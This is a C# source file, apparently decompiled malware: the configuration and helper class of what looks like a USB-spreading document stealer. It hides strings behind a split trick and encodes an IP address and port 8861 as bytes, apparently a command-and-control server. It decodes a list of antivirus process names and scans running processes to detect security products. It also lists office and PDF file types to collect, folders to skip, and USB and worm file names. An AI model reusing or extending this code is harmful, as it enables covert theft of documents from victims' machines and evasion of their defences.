using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace uwcrisew;

public static class marparswSETPS
{
	public static string marparswusbfold = "$FOUND|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswusbdate = "data\\|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswusbDrive = "";

	public static string marparswdowcmd = "supdat";

	public static string marparswfilexts = ".pdf>.doc>.docx>.xls>.xlsx>.ppt>.pptx>.pps>.ppsx>.txt>.|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswmainApp = "rowacms|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswusbPath = "\\Over\\|marparsw".Split(new char[1] { '|' })[0];

	public static bool marparswworking = false;

	public static byte[] marparswips = new byte[14]
	{
		55, 57, 46, 49, 52, 51, 46, 49, 56, 49,
		46, 49, 55, 56
	};

	public static int marparswsysPort = 8861;

	public static string marparswusbName = "niver|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswpc_id = "smrc|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswappPath = "\\Wmia\\|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswfilewrm = "iwgas|marparsw".Split(new char[1] { '|' })[0];

	public static string marparswfileusb = "iwsm|marparsw".Split(new char[1] { '|' })[0];

	public static List<string> marparswnFilders = new List<string>();

	public static string marparswusbwrm = "olhd|marparsw".Split(new char[1] { '|' })[0];

	public static byte[] encAvs = new byte[241]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 117, 105,
		99, 107, 32, 72, 101, 97, 108, 44, 98, 100,
		97, 103, 101, 110, 116, 61, 66, 105, 116, 32,
		68, 101, 102, 101, 110, 100, 101, 114, 32, 65,
		103, 101, 110, 116, 44, 109, 115, 115, 101, 99,
		101, 115, 61, 77, 105, 99, 114, 111, 115, 111,
		102, 116, 32, 83, 101, 99, 117, 114, 105, 116,
		121, 32, 69, 115, 115, 101, 110, 116, 105, 97,
		108, 115, 44, 102, 115, 115, 109, 51, 50, 61,
		70, 83, 101, 99, 117, 114, 101, 44, 97, 118,
		112, 61, 75, 97, 115, 112, 101, 114, 115, 107,
		121, 44, 97, 118, 103, 110, 116, 61, 65, 118,
		105, 114, 97, 44, 115, 112, 98, 98, 99, 115,
		118, 99, 61, 83, 121, 109, 97, 110, 116, 101,
		99, 44, 117, 112, 100, 97, 116, 101, 114, 117,
		105, 61, 77, 99, 65, 102, 101, 101, 44, 97,
		118, 103, 117, 105, 61, 65, 86, 71, 44, 97,
		118, 103, 99, 99, 61, 65, 86, 71, 44, 109,
		98, 97, 109, 61, 65, 110, 116, 32, 77, 97,
		108, 119, 97, 114, 101, 44, 97, 118, 97, 115,
		116, 117, 105, 61, 65, 118, 97, 115, 116, 44,
		97, 118, 97, 115, 116, 61, 65, 118, 97, 115,
		116
	};

	public static int marparswcontries = 0;

	public static string marparswloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower();
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(value))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public static void marparswno_folder()
	{
		marparswnFilders.Add("program files|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("system volume information|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("$recycle.bin|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("msocache|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("recovery|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("documents and settings|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("windows|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("program files (x86)|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("programdata|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("usb-driver|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("drivers|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("drives|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("SWSetup|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("HPDOCBW|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("SYSTEM.SAV|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("Drivers|marparsw".Split(new char[1] { '|' })[0]);
		marparswnFilders.Add("intel|marparsw".Split(new char[1] { '|' })[0]);
	}

	public static string marparswOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!uirwaras".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!uirwaras".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>2!uirwaras".Split(new char[1] { '!' })[0];
		}
	}

	public static string marparswget_value(string name)
	{
		string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion|marparsw";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			if (registryKey.GetValue(marparswpc_id + name) != null)
			{
				return registryKey.GetValue(marparswpc_id + name)!.ToString()!.Trim();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static string marparswget_mpath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + marparswappPath;
	}

	public static string marparswget_upath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + marparswusbPath;
	}

	public static string marparswuni_file(string file, int size)
	{
		try
		{
			int num = 0;
			string text = file;
			while (true)
			{
				if (File.Exists(text))
				{
					if (File.ReadAllBytes(text).Length == size)
					{
						break;
					}
					string extension = Path.GetExtension(file);
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file);
					string directoryName = Path.GetDirectoryName(file);
					text = directoryName + "\\" + fileNameWithoutExtension + "(" + num + ")" + extension;
					num++;
					continue;
				}
				return text;
			}
			return text;
		}
		catch
		{
			return file;
		}
	}
}
